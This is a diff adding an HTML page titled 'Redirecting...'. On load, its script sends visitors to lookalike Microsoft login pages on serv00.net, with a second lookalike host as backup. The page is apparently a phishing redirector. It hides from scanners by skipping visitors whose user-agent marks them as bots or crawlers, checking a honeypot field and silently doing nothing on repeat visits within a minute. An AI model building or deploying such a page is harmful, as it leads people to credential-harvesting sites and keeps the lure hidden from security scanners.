@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+    <script>
+        // URLs for primary and backup sites
+        const primaryURL = 'https://microsoft-team.serv00.net/login.html';
+        const backupURL = 'https://microsoft0365.serv00.net/login.html';
+
+        // Honeypot check to detect bots
+        function checkHoneypot() {
+            const honeypotField = document.getElementById('honeypot');
+            if (honeypotField.value !== '') {
+                return true;  // Bot detected
+            }
+            return false;
+        }
+
+        // Simple bot detection using user-agent
+        function isBot() {
+            const userAgent = navigator.userAgent.toLowerCase();
+            const botStrings = ['bot', 'crawl', 'spider', 'slurp', 'robot'];
+            return botStrings.some(bot => userAgent.includes(bot));
+        }
+
+        // Basic rate limiting (in-memory)
+        function rateLimit() {
+            const now = Date.now();
+            const lastVisit = localStorage.getItem('lastVisit');
+            if (lastVisit && (now - lastVisit < 60000)) {  // Less than 60 seconds
+                return true;  // Too many requests
+            }
+            localStorage.setItem('lastVisit', now);
+            return false;
+        }
+
+        // Function to check if the primary site is up
+        function checkPrimarySite() {
+            fetch(primaryURL, { method: 'HEAD' })
+                .then(response => {
+                    if (response.ok) {
+                        window.location.href = primaryURL;
+                    } else {
+                        redirectToBackup();
+                    }
+                })
+                .catch(() => {
+                    redirectToBackup();
+                });
+        }
+
+        // Function to redirect to the backup site
+        function redirectToBackup() {
+            window.location.href = backupURL;
+        }
+
+        // Function to perform security checks and redirect
+        function performRedirection() {
+            if (checkHoneypot() || isBot() || rateLimit()) {
+                // If any check fails, exit silently
+                return;
+            }
+            checkPrimarySite();  // Redirect immediately
+        }
+
+        // Start the redirection process immediately upon page load
+        window.onload = performRedirection;
+    </script>
+</head>
+<body>
+    <input type="hidden" id="honeypot" value="">
+    <p>Redirecting you to the site...</p>
+</body>
+</html>
